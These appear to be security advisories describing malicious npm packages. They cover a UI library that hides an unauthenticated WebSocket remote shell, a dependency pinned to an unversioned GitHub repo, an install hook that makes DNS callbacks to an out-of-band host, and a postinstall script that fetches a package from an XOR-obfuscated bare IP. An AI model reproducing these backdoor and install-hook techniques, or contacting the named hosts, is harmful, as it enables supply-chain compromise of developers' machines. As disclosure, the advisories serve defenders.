The package advertises itself as a UI-components library (README compares it to MUI), but its main export surface includes `useTerminal`, a server-side middleware that stands up a WebSocketServer (default path `/terminal-stream`) and, on every incoming WS message, spawns an interactive bash/powershell PTY via `pty.spawn` with the server process's own environment (`{...process.env, TERM: 'xterm-256color'}`) and cwd set to the user's home directory. Bytes received from the WebSocket are written directly into the PTY (`session.ptyProcess.write(parsed.data)`, with a fallback that writes raw message bytes), and PTY output is streamed back to the socket. No authentication, origin check, or handshake token gates the connection. `dist/terminal.js` ships the matching browser client (exported as `Terminal`) that connects to that same WebSocket and pipes keystrokes as `{type:'input', data:...}`, so the package ships both ends of a remote-shell channel. A consumer who mounts the exported hook — expecting a UI helper — exposes a full unauthenticated interactive shell on their server, executing as the server process. The mismatch between the marketed purpose (UI kit) and the shipped capability (network-driven RCE) is the shape of a backdoor delivered under a benign cover story.

---

advisories.description:
## Source: amazon-inspector (3bcbf6493a6aa37ccc827723d6fd73b082c66d10a549af2413aba2a8a6f47b7f)
package.json for @bil-rgb/baileys@1.0.0 declares its `libsignal` dependency as `github:tenka-san/libsignal-node` with no commit SHA, no tag, and no integrity check. `npm install` resolves this value by cloning whatever currently exists at HEAD of that personal GitHub user's repository and running any lifecycle scripts contained in it. package.json declares a hard dependency `libsignal` with the source `github:tenka-san/libsignal-node`. ## Source: amazon-inspector (66025f4cca9a4269af1b3b1278d850c9454b62d8e9ec90ad6e4ba8ac73c0fce2)
The package's `prepare` lifecycle script executes `node index.js`, which reconstructs the hostname `npmp19n5--768.oob.awss.dev` by joining a string array and issues a DNS lookup via `require('dns').lookup(...)`. The destination is an out-of-band application-security-testing callback host carrying a unique per-package label, so installing the package confirms code execution on the installer's machine to the operator of that domain. advisories.summary: Malicious code in @conduitops/logview-archive (npm)
advisories.description:
## Source: amazon-inspector (f20036e315be6c5dd925bdedc87120af27adb007a4c2b6653c95cb386acd9009)
On install, package.json's postinstall hook runs install.js, which invokes `npm install @conduit/logview-cli@2.2.0 --registry <URL>` where the registry URL is stored as a base64+XOR-masked string in lib/toolchain.json and decoded in memory by lib/origin.js (XOR key `c0ndu1t-ops`). The decoded destination is a plain-HTTP bare IP (http://139.196.94.195:8080/dl/npm/), not the public npm registry, a known publisher host, or an internal-DNS name consistent with the package's self-claimed `conduit.internal` provenance. npm will fetch and execute the lifecycle scripts of whatever package the attacker serves at that endpoint, giving arbitrary install-time code execution on the installer's host. A comment in lib/origin.js states the masking is intended so the downloaded package `carries no readable address`, confirming the concealment is deliberate rather than incidental.
